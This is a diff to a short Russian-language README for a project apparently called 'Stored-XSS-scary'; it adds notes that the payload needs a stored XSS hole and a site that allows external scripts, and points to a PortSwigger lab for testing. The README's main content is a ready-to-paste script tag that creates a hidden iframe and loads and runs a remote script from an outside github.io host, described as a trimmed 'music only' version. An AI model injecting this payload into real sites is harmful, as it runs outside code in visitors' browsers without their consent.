@@ -1,5 +1,10 @@
 # Stored-XSS-scary
 
+Код сработает только при наличии уязвимости stored XSS + сайт не будет блокировать загрузку внешних скриптов и стилей.
+Для теста можно запустить лабараторку в https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
+
+------------------------------------------
+
 Обрезанная версия (только запуск музыки):
 > <script>var frame = document.createElement("iframe"); frame.style.display = "none"; document.body.appendChild(frame); frame.onload = function() { var script = document.createElement('script'); script.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/start.js'; frame.contentWindow.document.head.appendChild(script)}</script>
 
